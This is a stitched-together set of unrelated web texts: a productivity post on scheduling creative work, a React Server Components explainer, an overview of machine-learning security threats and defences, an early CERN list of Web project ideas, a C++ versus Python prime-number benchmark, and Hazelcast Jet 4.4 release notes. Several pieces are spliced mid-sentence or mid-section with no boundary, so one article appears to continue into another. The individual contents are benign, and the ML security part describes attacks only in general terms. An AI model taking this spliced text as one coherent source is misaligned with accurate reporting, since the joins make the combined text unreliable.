<li>Tuesday - Team Meetings</li>
<li>Wednesday/Thursday - Creative Mode</li>
<li>Friday - Left open for Ad-hoc meetings</li>
</ul>
<p>If I’m working on a large strategy project, I’ll block off 4+ days per week to ensure I can make plenty of progress. If you take this approach, make sure you align your manager and have their support. Otherwise, you risk getting dinged for not collaborating.</p>
<p><strong>Batch meetings</strong> - Most days end up looking like swiss cheese - Lots of sproadic meetings with 30m-1hr in between. Squeeze your schedule so that the meetings all line up one after another. Paul Graham calls this ‘manager time’. Manager time is when we review and we discuss vs. when we create.</p>
<blockquote>
<p><em>“I find one meeting can sometimes affect a whole day. A meeting commonly blows at least half a day, by breaking  up a morning or afternoon. But in addition there's sometimes a cascading effect. If I know the afternoon is going  to be broken up, I'm slightly less likely to start something ambitious in the morning.</em>” (<a href="http://www.paulgraham.com/makersschedule.html">see: Maker’s Schedule, Manager’s schedule</a>).</p>
</blockquote>
<p>Going from meeting to meeting is draining, but those tiny blocks in between are useless and you’ll never make any meaningful creative progress. Batch your meetings so you have large blocks of uninterrupted time for creative thinking.</p>
<p><strong>Avoid context switching</strong> - Just like it takes time to switch into creative mode, it takes time to switch context between projects. If you’re working on multiple products or projects, designate specific days to work on each one. It takes me at least 2-3 hours to switch context from one project to another. If you want to make significant creative progress in a single day, you have to be very intentional (and typically use tactics like a long walk or lunch in between to clear your head). I typically will work on one project on Wednesday and another on Thursday to minimize switching.</p>
<p><strong>Let your teammates know</strong> - Now that you’ve rearranged your schedule, you need to publicize it so others respect it. Providing this context will set clear boundaries and make sure people understand the importance of focus.</p>
<ol>
<li>Align your manager to your schedule. Your manager will need to support you and help you defend your time.</li>
<li>Share your schedule in a team meeting or small group conversation. This will help socialize why you’re blocking off this time (which will increase the chance people will respect it) and give them a chance to give feedback or adjust your schedule.</li>
<li>Write a post/email with your schedule. Make it clear that you’re available outside of your focus blocks and will get back to messages quickly after each block is completed. Bonus points if you set this up as an auto-responder during your focus blocks.</li>
</ol>
<h2>Environment</h2>
<p>The right environment can make the difference between a session of fidgeting and one of deep focus. To take advantage of your focus blocks, you need to design your environment for creative mode. Eventually, your brain will start to recognize this place and will shift rapidly.</p>
<p><strong>Choose a separate space for creative thinking</strong> - This should be different than your typical work space. You want to avoid your brain switching into ‘task’ or ‘execution’ mode. If you normally work standing, try sitting in a chair. If you normally work in your office, shift to another room (if you have one!)</p>
<p><strong>Setup the space for creativity</strong> - You want your space to fade away. It should be calming, well lit, and comfortable. Not ‘lay down in bed and fall asleep’ comfortable, but enough that you can zone out from distractions around you and not think about adjusting your position. I like to let outside light in and add a few small touches such as a poster (<a href="https://romero.com/shop/p/armedcoders-rrdwf">here's mine 🤓</a>) or a special lamp that inspires you. If possible, avoid spaces with other people in them as their movement will distract you.</p>
<p><strong>Walk or move before you start</strong> - If possible, walk or move before you start. This could be a walk around the block or walking across your house to another room. Movement enables us to think more creatively and problem solve. I knew that Steve Jobs liked walking meetings, but there’s science to back it up:</p>
<blockquote>
<p><em>"Creative thinking improves while a person is walking and shortly thereafter ... The study found that walking indoors or outdoors similarly boosted creative inspiration. The act of walking itself, and not the environment, was the main factor."</em> (<a href="https://news.stanford.edu/2014/04/24/walking-vs-sitting-042414/">Stanford Graduate School of Education</a>)</p>
</blockquote>
<p>I’ve started using walking as a tool to start and end sessions. If I’m stuck, taking a walk (or <a href="https://www.youtube.com/watch?v=O6sdWYXB8RQ">riding my surf skate</a>) can help unblock me.</p>
<p><strong>Create playlists with noise cancelling headphones</strong> - This has been the most impactful change to my routine. Music seem sto help me enter creative mode very quickly. I have a pair of <a href="https://www.amazon.com/gp/product/B07RQ366VK/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=B07RQ366VK&amp;linkCode=as2&amp;tag=bdickason-20&amp;linkId=29ec5297cca7ec448acba6f3bced2c8a">Jabra Elite 85h</a> in beige because I like the feel over ear headphones and they never have issues connecting to my devices. Whenever I sit down for creative time, I have a specific playlist that I put on and listen to on repeat. It’s repetitive, has few words, and the volume is pretty constant. I have a similar playlist for execution/tasks. <strong><a href="https://open.spotify.com/playlist/5pHtl20zTPi6rk6Flo1En9?si=_lyBpvl0RWWC4uJV8u1DEQ">Creative Playlist</a> / <a href="https://open.spotify.com/playlist/7KWYiMbxzJH8WqPvdEf3mg?si=e6L2NoY7QFWKPoxJsoiH7w">Execution Playlist</a></strong></p>
<p><strong>Remove every distraction</strong> - PM’s pride themselves in being available, but even the vibration from your phone can pull you out of creative mode. Turn everything off:</p>
<ul>
<li>Close apps and tabs</li>
<li>If possible, turn off wifi</li>
<li>Turn on Do Not Disturb on your laptop</li>
<li>Use a minimalist writing app with focus mode like <a href="https://ia.net/writer">iA Writer</a></li>
<li>Put your phone on airplane mode (ideally in a different room)</li>
</ul>
<p>These may sound silly or extreme, but every little bit helps.</p>
<h2>Make it easy to start</h2>
<p>Ok, you’ve got your calendar dialed and you’re in your magic rocket ship creativity chair. Great. Now you pull out a blank page and.... Crap. You’re stuck.</p>
<p><strong>Never start with a blank page</strong> - A blank page can be intimidating and challenging. A good note taking system can shortcut this and make sure you always have a starting point.</p>
<blockquote>
<p><em>“Everybody’s got an eye for something. The only difference is that I carry around a notebook in my front pocket. I write everything down, and it helps me recall.”</em> (<a href="https://perell.com/essay/how-to-cure-writers-block/">David Sedaris via David Perell</a>)*.</p>
</blockquote>
<p>Throughout the week, jot down notes about your topic. These could be words that come to mind, short phrases or links, or even an entire outline. The key is to take ideas as they come to you (vs when you sit down to work) and plant tiny seeds of ideas on paper (or in your note taking app). They don’t have to be fully formed, they just need to give you a starting point when you sit down so you’re not starting from scratch.</p>
<p>I take notes using <a href="https://culturedcode.com/things/">Things</a> on my phone or desktop. You might choose an app or pen and paper. The important part is that you write them down and remember them when the time comes.</p>
<img src="https://bdickason.com/static/posts/unlock-creative-strategic-thinking/post-outline.png">
<p>Here’s an example of my starting point for this post.</p>
<p><strong>You don’t have to start at the beginning</strong> - My best strategy work happens when I start in the middle. Creative thinking is unstructured by nature and you want to let your creative faucet flow. Trying to force yourself to follow a structure will only cause you to get stuck on a specific section. <em>“Start writing wherever you can start.</em> <em>Start writing wherever you feel comfortable”</em> (<a href="https://www.dailywritingtips.com/break-writers-block-dont-begin-at-the-beginning/">Daily Writing Tips</a>).</p>
<p>Think of creative mode like a fitted sheet, you put one corner on, then the other, then go back and adjust the first corner. If words come to you, write them down. If two thoughts seem linked, write both and draw a line to connect them. Let the ideas flow in any order they come. Over time, your brain will connect them.</p>
<p><strong>Leave yourself breadcrumbs -</strong> Remember, each time you enter creative mode, your brain has to boot up your whole project in your head. You can help your future self by leaving notes about what you plan to do next. “<em>Unfortunately, most writers get right in their cars and drive away. But the great ones capture the view.”</em> (<a href="https://perell.com/note/leave-a-summary-for-yourself/">Leave a Summary for Yourself by David Perell</a>) This could be a short outline at the top of the document or notes peppered throughout. Keep track of what ideas you were excited about so you don’t have to analyze the entire strategy or vision. For example, for this post I left …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>Around Christmas, the React team introduced <a href="https://reactjs.org/blog/2020/12/21/data-fetching-with-react-server-components.html" target="_blank" rel="noreferrer">React Server Components</a>. It’s a complete surprise for the React ecosystem as React has always focused on the client-side with a small focus on server-side rendering. Server-side rendering can, for instance, be accomplished using Next.js. </p><p>However, with React Server Components (RSC), it’s now possible to write server-rendered code using React only. Note that RSC is not a final feature as of now. Currently, React Server Components are undergoing beta-testing.</p><p>In this article, you’ll learn the following concepts about React Server Components:</p><ol><li>What is a React Server Component?</li><li>Why do we need React Server Components? What problems do they solve?</li><li>What does a React Server Component look like, and what are the benefits?</li><li>What’s the difference between React Server Components and Server Side Rendering (SSR)?</li><li>Is there any future for React Server Components?</li></ol><h2 id="what-is-a-react-server-component">What is a React Server Component?</h2><p>Let’s make this clear first: React always renders React Server Components on the server. It allows frontend developers to create components that span both server and client. </p><p>Why is this useful? This property allows developers to quickly fetch data from external sources Therefore, you don’t have to send an expensive request from your client to your database (for example) to fetch data. As you render your components on the server that also hosts your backend, you can make a local call to your API to fetch data. In other words, locally fetched data is super fast (cheap).</p><p>To summarize, React Server Components allow you to access the speed of fetching data on the server-side while maintaining its rich interactivity of client-side apps. That’s a fantastic improvement for the React ecosystem to build faster applications.</p><h2 id="why-do-we-need-react-server-components">Why do we need React Server Components?</h2><p>UI development needs to offer the following properties:</p><ol><li>It should offer a good user experience</li><li>It should be cheap to maintain</li><li>It should offer fast performance</li></ol><p>However, these properties are at odds with each other.

React won’t include a dependency that you use only in a React Server Component in the bundle size. Therefore, the user won’t have to download this dependency. The RSC will use this dependency on the server to render the required output and send this output to the client. Cool, right?</p><h2 id="whats-the-difference-between-react-server-components-and-server-side-rendering-ssr">What’s the difference between React Server Components and Server Side Rendering (SSR)?</h2><p>Server-side rendering focuses on reducing the initial page load. When using SSR, you send HTML to the client. The client then loads all of the React JavaScript you need to make your web page interactive. In other words, you have a traditional React app after the initial page load when React injects all JavaScript. </p><p>The most significant difference is that your components are still client-side components. All required dependencies are still downloaded. The only difference when using SSR is that your initial page load contains only HTML to improve performance.</p><h2 id="is-there-any-future-for-react-server-components">Is there any future for React Server Components?</h2><p>There’s a massive potential for React Server Components as they address many tradeoffs React developers experience. Some of the most important benefits include:</p><ul><li>Fast data fetching locally on a server</li><li>Server-side dynamic logic</li><li>Ability to include any dependency for RSCs without having to worry about increasing the cost to load a web page</li></ul><p>On the other hand, many React users might get confused at first by this domain switch. React has shown a strong focus on the client-side in the past. React Server Components suddenly span both server and client. This change requires a significant shift in the way we think about React components. </p><p>For that reason, I expect React developers to embrace this approach but also to see many people struggle to grasp this concept and make correct decisions about server/client-side components.</p><p>If you want to play around with the demo code for React Server Components, you can find this code on <a href="https://github.com/reactjs/server-components-demo" target="_blank" rel="noreferrer">GitHub</a>.</p><h2 id="monitor-bad-and-slow-requests-in-production">Monitor bad and slow requests in production</h2><p>While RSC will let you work seemlessly with back-end and front-end requests, debugging data fetching requests and responses in production may be challenging and time consuming.

Yet, it presents a risk that is growing with the increase of AI adoption rate.</p>
<p>In this post I’ll go over the main concepts to understand this subject:</p>
<ol>
<li><strong>Why</strong> do we need to care about the security of ML systems ?</li>
<li><strong>What</strong> are the vulnerabilities of ML systems ?</li>
<li><strong>How</strong> can we secure ML Systems ?</li>
</ol>
<h2>Why should we care ?</h2>
<p>Machine Learning models are more and more integrated in sensitive decision-making systems such as autonomous vehicles, health diagnosis, credit scoring, recruitment, etc. Some models can be trained on personal data like private emails, photos and messages from social media.</p>
<p>Machine learning models are complex software components and can be compromised. Vulnerable systems can lead to:</p>
<ul>
<li><strong>Data extraction:</strong> the exposure of sensitive information or specific details included in the data used for training the models.</li>
<li><strong>Model extraction:</strong> copying a model by stealing the internal parameters and hyperparameters.</li>
<li><strong>Model tricking:</strong> fooling the model by manipulating the inputs, leading to erroneous decisions.</li>
<li><strong>Model corruption:</strong> methods that perturb the inner functioning of the model to generate corrupted outputs.</li>
</ul>
<h2>What are the threats ?</h2>
<p>Here is a list of some vulnerabilities from which ML models suffer, this is a non-exhaustive list:</p>

<h3>Data extraction</h3>
<ul>
<li>
<p><strong>Unintended Memorization</strong></p>
<p>Deep learning models and in particular generative models suffer from unintended memorization<sup>1</sup>, they can memorize rare details from the training data. Using only inferences from the model, it is possible to extract sensitive information from the training dataset.</p>
<p>This method was used to extract credit card details and social security numbers from Gmail’s Smart Compose feature that helps you to write emails faster.</p>
</li>
<li>
<p><strong>Membership Inference</strong></p>
<p>Using this technique an attacker can infer whether a new data record is included in the training dataset or not.</p>
</li>
</ul>
<h3>Model extraction</h3>
<ul>
<li>
<p><strong>Model Stealing</strong></p>
<p>Using these methods and by querying models (with predictions APIs), it is possible to extract an equivalent ML model. These attacks are successful against a wide variety of model types: logistic regressions, decision trees, SVMs and deep neural networks.</p>
<p>A set of model extraction attacks were used to steal model types and parameters from public machine learning services such as BigML and Amazon Machine Learning in 2016 <sup>2</sup>.</p>

</ul>
<h3>Model tricking</h3>
<ul>
<li>
<p><strong>Adversarial attacks</strong></p>
<p>Adversarial attack is maybe one of the most known attacks on deep neural networks since it has been widely mediatized. It works by providing deceptive input at inference time. It’s a powerful method because the noise added to the input can be imperceptible and it does not depend on the architecture of the attacked model.</p>
<p>In the following example <sup>3</sup>, the model is tricked to classify the image as “guacamole”.</p>

</ul>
<h3>Model corruption</h3>
<ul>
<li>
<p><strong>Data Poisoning</strong></p>
<p>Training data often include information harvested by automated scrapers or from unverified sources on the web, this is a vulnerability that can be exploited to tamper with models.</p>
<p>For example, data poisoning was used to generate undetectable spam messages <sup>4</sup>.</p>
</li>
<li>
<p><strong>Backdoor attacks</strong></p>
<p>These methods work by injecting a trojan in the training data or in a pre-trained model that is activated by a trigger at inference time to make the model output a specific result. It is model-agnostic.</p>
<p>In this example the trigger is a small square patch or sticker that is used to flip the identification of the stop sign <sup>5</sup>.</p>
<p><span>

    </span></p>
</li>
<li>
<p><strong>Attacks on Transfer Learning</strong></p>
<p>If a pre-trained model is corrupted with data poisoning or a backdoor attack, it is likely that a new model that is trained using the corrupted model as a starting point will be corrupted as well.</p>
</li>
</ul>
<p><strong>Federated Learning</strong>, considering its distributed nature, can be even more exposed to Model corruption through training data manipulation as we can assume that an ML hacker has a full control of part of the training samples and labels. Federated learning can also be subject to data extraction attacks through the leakage of gradients shared between the workers and/or the server <sup>6</sup>.</p>
<h2>How can we secure models ?</h2>
<p>Machine Learning security is an active research area, and since we are dealing with computer systems we cannot have a 100% secure system. Some of the defense mechanisms that exist are only experimentally validated, so we have to be aware that they can be broken.</p>
<ul>
<li>
<p><strong>Differential Privacy</strong></p>
<p>Differential Privacy can be used against data extraction attacks. The aim of this technique, applied during the training of the model, is to approach similar outputs when the training is done with the sensitive data or without it. It tries to ensures that the model does not rely too much on individual samples <sup>1</sup>. In practice, that comes at the expense of accuracy.</p>
</li>
<li>
<p><strong>Homomorphic encryption</strong></p>
<p>Homomorphic encryption is an encryption method that enables computations on encrypted data directly. It ensures that the decrypted result is the same as if the computation had been done on unencrypted inputs. In a simplified way, for an encryption function <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">E</mi></mrow><annotation encoding="application/x-tex">\mathcal{E}</annotation></semantics></math></span></span>:</p>

<p>It is one of the defense mechanisms used in Federated learning.</p>
</li>
<li>
<p><strong>Randomization methods</strong></p>
<p>The goal of these techniques is to protect Deep Neural Networks models against perturbations by adding randomness to test points and using the fact that Deep Neural Networks are robust to random perturbations. A random input transformation can help mitigate adversarial effects. Random smoothing technique is used to perturb backdoor attack triggers <sup>7</sup>.</p>
</li>
<li>
<p><strong>Input Preprocessing</strong></p>
<p>Input preprocessing can be used against backdoor attacks or adversarial attacks, by modifying the model input during training or testing. Autoencoders can be used to clean the input. An imperfect reconstruction can make the model unable to recognize triggers <sup>7</sup>.</p>
</li>
<li>
<p><strong>Adversarial training</strong></p>
<p>In this method, we train the model by adding adversarial samples in the training data to improve its robustness against adversarial attacks <sup>8</sup>.</p>
</li>
</ul>
<h2>Conclusion</h2>
<p>Machine Learning systems are complex software systems where software code and data are interlaced, so they do not only face computer security risks but also data threats. Data Scientists and ML Engineers need to be aware of these risks when they design their Machine Learning systems.</p>

There are many of these ...if you have a moment, take your pick! Some
of these would make good projects, or would be a way your organization
could contribute to the building of the web.<p>
There are also special lists of little things to do for each existing
project such as the <a name="1" href="http://info.cern.ch/hypertext/WWW/LineMode/Defaults/Bugs.html">line mode browser</a> , the <a name="2" href="http://info.cern.ch/hypertext/WWW/NeXT/Implementation/Bugs.html">NeXT browser</a> , the common<a name="5" href="http://info.cern.ch/hypertext/WWW/Library/Bugs.html">
library</a> , and the <a name="3" href="http://info.cern.ch/hypertext/WWW/Daemon/Bugs.html">server</a> .
</p><h2>Client side</h2>
<dl>
<dt>More clients
</dt><dd> Clients exist for many platforms, but not all. Editors
only exist on the NeXT, but will be really useful for sourcing info
and group work. (Group editor?)
</dd><dt>Search engines
</dt><dd> Now the web of data and indexes exists, some really
smart intelligent algorithms ("knowbots?") could run on it.  Recursive
index and link tracing, Just think...
</dd><dt>Text from hypertext
</dt><dd> We need a quick way to print a book from the web.
(A simple method using TeX exists)
</dd></dl>

<h2>Server side</h2>
<dl>
<dt>Server upgrade
</dt><dd> Easier to install, port.  Export directories as hypertext.
Run shell scripts embedded in the directory for virtual documents
and searches.
</dd><dt>More Servers
</dt><dd> See the <a name="4" href="http://info.cern.ch/hypertext/DataSources/Overview.html">list</a> of things we have thought of or been pointed
to.
</dd><dt>WAIS integration
</dt><dd> WAIS protocol extensions to allow hypertext; HTML
data type, docids to be conforming UDIs. Integrate WAIS in client
too.
</dd><dt>Integrate client and server
</dt><dd> A client which generates HTML becomes
a general purpose gateway. Especially useful for sites where general
access to news, external internet, etc, is limited.
</dd></dl>

<h2>Other software</h2>
<dl>
<dt>Gateways
</dt><dd> JANET and DECnet for example. Real need.
</dd><dt>HTTP enhancements
</dt><dd> Format conversion, authorization, better logging
information for statistics.
</dd><dt>Mail manager
</dt><dd> A hypertext view of a mail archive with lists of messages
by author, topic, with links between messages. A friendly face on
a mail archive would be a great project management tool.
</dd><dt>HTTP enhancements
</dt><dd> Format conversion, authorization, better logging
information for statistics.
</dd><dt>Form processing
</dt><dd> If you can edit hypertext, you edit a hypertext form
and return it.   To be able to submit a form back to the server would
allow  special search patterns, administrative processing, electronic
voting, ...
</dd><dt>Graphic overview
</dt><dd> Display the web from any document in a graphical
form.
</dd></dl>

<h2>Documentation</h2>
<dl>
<dt>Tutorials
</dt><dd> Hypertext leading a new or prospective user through W3.
</dd><dt>Canned demos
</dt><dd> A hypertext path through some good represenattive places
to visit. Maybe a script to make a timed presentation (with sound?).
</dd><dt> Videos
</dt><dd> Would save us giving so many talks!
</dd><dt>Policy documents
</dt><dd>Statements on NIR: collect from institutes, provide
background for organizations making NIR policy decisions.

<p>Calculating prime numbers in a range is another comparison in programming languages. In this article, we compared the speed of codes to find Prime Number functions in C++ and Python</p>
<h2>1. Introduction</h2>
<p>Prime numbers are an interesting area to research. A&nbsp;<a target="_blank" href="https://en.wikipedia.org/wiki/Prime_number" rel="noreferrer noopener"><strong>prime number</strong></a>, it is also called&nbsp;<strong>prime</strong>&nbsp;shortly, is a natural number (a positive integer) greater than one that is not a product of two smaller natural numbers. If a number is not prime then it is called a&nbsp;<strong>composed number</strong>. There are several mathematical questions regarding prime numbers that are still unsolved. Finding them and relations and their effects on some other functions, graphics really interesting in mathematical phenomena.</p>
<p>In the programming world today,&nbsp;<a target="_blank" href="https://www.python.org/" rel="noreferrer noopener">Python</a>&nbsp;is very popular and easy to use. It makes popular because of supports from big companies (i.e. Google) and its successful libraries and frameworks on AI Technology. It is a great object-oriented, interpreted, and interactive programming language. It is often compared with C/C++, Delphi, Lisp, Tcl, Perl, Ruby, C#, Visual Basic, Visual Fox Pro, Scheme, or Java. Python has very clear syntax and it has some practical things. It has modules, classes, exceptions, very high-level dynamic data types, and dynamic typing. There are interfaces to many system calls and libraries, as well as to various windowing systems. New built-in modules are easily written in C or C++. Python is also usable as an extension language for other applications written in other languages that need easy-to-use. Python is free to use and more information can be found from their official web page&nbsp;<a target="_blank" href="https://www.python.org/" rel="noreferrer noopener">https://www.python.org/</a></p>
<p>C and C++ are the fastest and one of the most powerful programming languages and it is easy to calculate prime numbers as fast as possible. In these tests we will use&nbsp;<a target="_blank" href="https://www.embarcadero.com/products/cbuilder" rel="noreferrer noopener">C++ Builder</a>&nbsp;which has a great IDE, includes compilers for Win32, Win64, Android, and iOS. C++Builder has both CLANG Enhanced C/C++ Compiler and Embarcadero’s new Bcc C/C++ Compiler. It also features a modern, high-productivity RAD Studio IDE, debugger tools, and enterprise connectivity to accelerate cross-platform UI development. You can develop GUI based applications easily, as it comes with the award-winning VCL framework for high-performance native Windows apps and the powerful FireMonkey (FMX) framework for cross-platform UIs. There is a free C++ Builder Community Edition that can be used by students, beginners, and startups with limitations.&nbsp;</p>
<p>You can download the free C++ Builder Community Edition here:&nbsp;<a target="_blank" href="https://www.embarcadero.com/products/cbuilder/starter" rel="noreferrer noopener">https://www.embarcadero.com/products/cbuilder/starter</a>. Professional developers can use the Professional, Architect, or Enterprise versions of C++ Builder. Please visit&nbsp;<a target="_blank" href="https://www.embarcadero.com/products/cbuilder" rel="noreferrer noopener">https://www.embarcadero.com/products/cbuilder</a>.</p>
<p>Python can be used inside Delphi projects and this prime number function is tested before in Delphi and in Python here&nbsp;<a target="_blank" href="https://www.youtube.com/watch?v=aCz5h96ObUM" data-rel="lightbox-video-0" rel="noreferrer noopener">https://www.youtube.com/watch?v=aCz5h96ObUM</a>&nbsp;with Kiriakos Vlahos. Here, we were inspired by this video and we try to do the same tests on the same function in C++. Finding Prime Numbers in C++ is explained in detailed well in this&nbsp;<strong>Easily Learn To Find Prime Numbers In Modern C++</strong>&nbsp;post&nbsp;<a target="_blank" href="https://learncplusplus.org/easily-learn-to-find-prime-numbers-in-modern-c/" rel="noreferrer noopener">here</a>.&nbsp;</p>
<p>Here, we compared the speed of Prime Number functions in C++ Builder 10.4 and Python 3.9.1.</p>

<p>In these counting prime numbers tests we also found that Python 3.9.1 version looks faster than 3.7.9 version which comes with current Spyder editor. It is obvious that 64bits test doubles 32bits test in speed.</p>
<p>We also tested counting prime numbers with same procedures in C++ Builder with system information in <a href="https://learncplusplus.org/interesting-c-builder-compiler-counting-prime-number-benchmarks/">our post here</a> before. Here are some of results.</p>

<p>These tables above show that calculating the number of prime numbers in 32bits takes 0.494 seconds in C++ Builder (including with Modern FMX GUIs) and Python 3.9.1 is doing the same operation in 8.770 seconds In this test, in comparison C++ Builder is&nbsp;<strong>17.8 times faster in 32bits</strong>&nbsp;and calculating number of prime numbers in 64bits takes 0.350 seconds in C++ Builder (including with Modern FMX GUIs) and Python 3.9.1 is doing the same operation in 3.298 seconds that means C++ Builder is&nbsp;<strong>9.4 times faster in 64bits</strong>. Note that we made the same tests before with&nbsp;<strong>GNUC/C++</strong>&nbsp;on the same system and we post it&nbsp;<a target="_blank" href="https://learncplusplus.org/quickly-learn-to-count-prime-numbers-in-gnu-c-on-windows/" rel="noreferrer noopener">here</a>&nbsp;and&nbsp;<a target="_blank" href="https://learncplusplus.org/learn-to-count-prime-numbers-in-visual-studio-code-c/" rel="noreferrer noopener">here</a>&nbsp;with&nbsp;<strong>VSCode</strong>&nbsp;before, and we did the same tests on the latest Dev-C++ and results can be found&nbsp;<a target="_blank" href="https://learncplusplus.org/dev-c-tutorial-easily-learn-to-count-prime-numbers-on-windows/" rel="noreferrer noopener">here</a>. All C++ tests are runs with about the same scores in different compilers on the same system given above.</p>
<p>We also found that Python 3.7.9 comes with Spyder is slower than 3.9.1 in our tests. Here is a table in comparison with C++ Builder below.</p>

<h2>6. Conclusion</h2>
<p>In conclusion, on the same PC System, our tests show that C++ ( C++ Builder BCC &amp; CLANG, GNU C/C++, Dev C++, VS Code) is about 9.4 times faster than Python on counting prime numbers in 64 bits and about 17.8 times faster in 32 bits. The calculating number of prime numbers is good to use some basic logical operations and mathematical functions. The procedure includes logical if() clauses, for() loops, some mathematical procedures (floor, sqrt etc.), that show C++ is very fast in mathematical operations. These kinds of tests can be done in different operations to compare languages.</p>
<p>Note that all tests were done on a single core/thread test. C++ Builder is capable to do Threads and easy to use Parallel algorithms for multi-thread operations. It shows that threaded tests are much faster, depends on the number of cores/threads.</p>
<p>Actually, results were obvious because of Python is an interpreted programming language with some benefits while C/C++ is a non-interpreted (compiled) programing language. Here C++ proofs that still it is very fast to do mathematical operations in comparison with Python. These kinds of tests can be done on many mathematical operations and on other codes. Speed changes may improve analyzes and other operations (i.e face detection, image processing, or other AI technologies). If your applications are built with C++ they will have faster operations in each task. On the other side, Python has some advantages in coding, easy to code, well on AI technologies with some TensorFlow, Keras frameworks. Users should define their priorities before coding an application and they should choose their programming language for their projects.</p>
<p>Please keep following our next posts on these tests.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>Today we're releasing Hazelcast Jet 4.4 and we have some exciting new
features!</p>
<h2>Jet SQL</h2>
<p>Hazelcast Jet 4.4 brings you the first beta version of our SQL
interface. You can now log into Jet from the command line and issue
queries against the data sources you specify. They can be both data at
rest (<em>batch</em> sources) and live feeds (<em>streaming</em> sources).</p>
<p>If you have Docker at hand, here's something you can try out right now!
(For examples that don't require Docker, go to the
<a href="https://jet-start.sh/docs/sql/intro">docs</a>.)</p>
<pre><code>docker pull hazelcast/hazelcast-jet
docker network create jet-network
docker run --name jet --network jet-network -v <span>"<span>$(pwd)</span>"</span>:/csv-dir --rm hazelcast/hazelcast-jet
</code></pre>
<p>Wait for a message like this in the output:</p>
<pre><code>2021-01-15 17:50:18,645 [ INFO] [main] [c.h.c.LifecycleService]:
    [172.17.0.2]:5701 is STARTED
</code></pre>
<p>Now start another terminal window and enter the SQL shell:</p>
<pre><code>$ docker run --network jet-network -it --rm hazelcast/hazelcast-jet jet --targets jet sql
Connected to Hazelcast Jet 4.4 at [172.17.0.2]:5701 (+0 more)
Type 'help' for instructions
sql〉
</code></pre>
<p>You are now ready to write some SQL. Try these:</p>
<pre><code>sql〉 <span>SELECT</span> * <span>FROM</span> <span>TABLE</span>(generate_series(<span>1</span>,<span>3</span>));
+
|           v|
+
|           1|
|           2|
|           3|
+
3 row(s) selected
sql〉 <span>SELECT</span> <span>key</span>, <span>sum</span>(<span>key</span>) <span>as</span> total <span>FROM</span> (
          <span>SELECT</span> v/<span>2</span> <span>as</span> <span>key</span> <span>FROM</span> <span>TABLE</span>(generate_series(<span>0</span>, <span>7</span>))
      ) <span>GROUP</span> <span>BY</span> <span>key</span>;
+
|                 key|               total|
+
|                   0|                   0|
|                   1|                   2|
|                   2|                   4|
|                   3|                   6|
+
4 row(s) selected
</code></pre>
<p>Here are two more examples with streaming SQL. Streaming queries never
complete, so use <code>Ctrl+C</code> to cancel them after a while:</p>
<pre><code>sql〉 <span>SELECT</span> * <span>FROM</span> <span>TABLE</span>(generate_stream(<span>10</span>));
+
|                   v|
+
|                   0|
|                   1|
|                   2|
^C
Query cancelled.
sql〉 <span>SELECT</span> * <span>FROM</span> <span>TABLE</span>(generate_stream(<span>100</span>)) <span>WHERE</span> v / <span>10</span> * <span>10</span> = v;
+
|                   v|
+
|                   0|
|                  10|
|                  20|
^C
Query cancelled.
sql〉
</code></pre>
<p>For more examples with CSV files, Kafka and IMap, go to the
<a href="https://jet-start.sh/docs/sql/intro">docs</a>.</p>
<p>We're currently very focused on bringing more features to our SQL, so
stay tuned!</p>
<h2>File Connector</h2>
<p>The <a href="https://jet-start.sh/docs/api/sources-sinks">Unified File Connector API</a> gives you a
simple way to read files, unified across different storage systems.
Using the same API you can read files from the local filesystem, Hadoop
FS, Amazon S3, Google Cloud Storage, and Azure Blob Storage. At the same
time, the connector supports a variety of encoding formats: text files,
CSV, JSON, Avro, etc., equally for all storage systems.</p>
<p>Here's how the Java syntax looks:</p>
<pre><code><span>BatchSource</span><span><span>&lt;</span><span>String</span><span>&gt;</span></span> source <span>=</span> <span>FileSources</span>
    <span>.</span><span>files</span><span>(</span><span>"/path/to/my/directory"</span><span>)</span>
    <span>.</span><span>build</span><span>(</span><span>)</span><span>;</span>
</code></pre>
<p>You specify the storage system type with the URI schema, for example to
access S3:</p>
<pre><code><span>BatchSource</span><span><span>&lt;</span><span>String</span><span>&gt;</span></span> source <span>=</span> <span>FileSources</span>
    <span>.</span><span>files</span><span>(</span><span>"s3a://bucket-id/path/to/my/directory"</span><span>)</span>
    <span>.</span><span>build</span><span>(</span><span>)</span><span>;</span>
</code></pre>
<p>And this is how you tell it to use the Avro encoding:</p>
<pre><code><span>BatchSource</span><span><span>&lt;</span><span>User</span><span>&gt;</span></span> source <span>=</span> <span>FileSources</span>
    <span>.</span><span>files</span><span>(</span><span>"s3a://bucket-id/path/to/my/directory"</span><span>)</span>
    <span>.</span><span>format</span><span>(</span><span>FileFormat</span><span>.</span><span><span>&lt;</span><span>User</span><span>&gt;</span></span><span>avro</span><span>(</span><span>)</span><span>)</span>
    <span>.</span><span>build</span><span>(</span><span>)</span><span>;</span>
</code></pre>

<h2>Kinesis Connector</h2>
<p><a href="https://aws.amazon.com/kinesis/data-streams/">Amazon Kinesis Data
Streams</a> (KDS) is a
durable, scalable real-time data streaming service native to the AWS
environment, and fully managed by it. You can use it as both a source
and a sink in a Hazelcast Jet pipeline:</p>
<pre><code><span>StreamSource</span><span>&lt;</span><span>Map<span>.</span>Entry</span><span>&lt;</span><span>String</span><span>,</span> <span>byte</span><span>[</span><span>]</span><span>&gt;&gt;</span> source <span>=</span> <span>KinesisSources</span>

<h2>Enforce Strict Event Order</h2>
<p>Hazelcast Jet's primary focus is to leverage all opportunities to
improve the throughput and latency of its computation. One example is
using logic that isn't sensitive to the exact event order. Jet can use
this freedom to optimally load-balance the data across parallel tasks.
This works great for stateless transforms like <code>map</code> and <code>filter</code> as
well as aggregate operations specifically written in terms of
commutative and associative functions. However, Jet also supports
transforms such as <code>mapStateful</code>, where reordering any two events is
likely to result in different output.</p>
<p>In version 4.4 we provide a new option,
<code>pipeline.setPreserveOrder(true)</code>, which tells Jet to disable the
dataflow optimizations that result in reordered events. One consequence
of enabling it is that the level of parallelism in the source stage
determines the parallelism of all the subsequent stages because the data
flows in parallel lanes through the pipeline. So if you have a source
that isn't paralellized, your whole pipeline won't be parallelized
either (at least until a stage that explicitly changes the order, such
as <code>rebalance</code> or <code>groupingKey</code>). This feature works best when you have
a partitioned source and you only require strict order among events with
the same key. Then you get both the ordering you need and decent
parallelization.</p>
<h2>Improved Packaging</h2>
